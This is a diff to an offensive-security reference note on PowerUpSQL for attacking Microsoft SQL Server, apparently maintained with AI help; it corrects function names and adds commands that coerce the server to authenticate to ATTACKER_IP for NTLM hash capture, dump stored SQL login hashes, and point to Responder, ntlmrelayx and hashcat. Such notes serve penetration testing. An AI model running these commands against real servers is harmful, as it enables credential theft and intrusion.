@@ -88,12 +88,14 @@ Invoke-SQLAuditPrivImpersonateLogin -Instance "MSSQL01" -Exploit -Verbose
 Invoke-SQLAuditPrivTrustworthy -Instance "MSSQL01" -Verbose
 Invoke-SQLAuditPrivTrustworthy -Instance "MSSQL01" -Exploit -Verbose
 
-# Full privilege audit
+# Full privilege audit (checks every known privesc path, incl. xp_cmdshell usability)
 Invoke-SQLAudit -Instance "MSSQL01" -Verbose
 
-# Check for xp_cmdshell or if it can be enabled
-Invoke-SQLAuditPrivXpCmdshell -Instance "MSSQL01" -Verbose
-Invoke-SQLAuditPrivXpCmdshell -Instance "MSSQL01" -Exploit -Verbose
+# There is NO Invoke-SQLAuditPrivXpCmdshell. For xp_cmdshell, Invoke-SQLAudit flags it and
+# Invoke-SQLOSCmd auto-enables it if you're sysadmin (see OS Command Execution below).
+# The real UNC-coercion audit primitives (force SQL to auth out) are:
+Invoke-SQLAuditPrivXpDirtree  -Instance "MSSQL01" -Verbose
+Invoke-SQLAuditPrivXpFileexist -Instance "MSSQL01" -Verbose
 ```
 
 ---
@@ -141,8 +143,14 @@ Get-SQLQuery -Instance "MSSQL01" -Query "EXEC ('xp_cmdshell ''whoami''') AT [MSS
 ## Credential Capture — UNC Path Coercion
 
 ```powershell
-# Force SQL Server to authenticate to your Responder listener (capture service account hash)
-Get-SQLServiceAccountPwHashes -Instance "MSSQL01" -CaptureIP ATTACKER_IP -Verbose
+# Force SQL Server to authenticate to your Responder/ntlmrelayx listener and capture the
+# service-account hash. The real function is Invoke-SQLUncPathInjection
+# (Get-SQLServiceAccountPwHashes does not exist):
+Invoke-SQLUncPathInjection -Instance "MSSQL01" -CaptureIp ATTACKER_IP -Verbose
+
+# Enumerate the SQL service account, and dump stored SQL login password hashes (sysadmin):
+Get-SQLServiceAccount -Instance "MSSQL01"
+Get-SQLServerPasswordHash -Instance "MSSQL01" -Verbose
 ```
 
 ```bash
@@ -188,6 +196,10 @@ Get-SQLInstanceDomain |
 
 ---
 
+> [!note] **See also** — the Linux/targeted counterpart is [[Tools/Database/mssqlclient|mssqlclient]] (impacket) once you know the instance; service reference [[Services/Database Services/MSSQL|MSSQL]]. Catch the `Invoke-SQLUncPathInjection` coercion with Responder/[[Tools/Lateral Movement/ntlmrelayx|ntlmrelayx]], and crack `Get-SQLServerPasswordHash` output with [[Tools/Auth/hashcat|hashcat]].
+
+---
+
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-27*
+*Model: claude-opus-5*
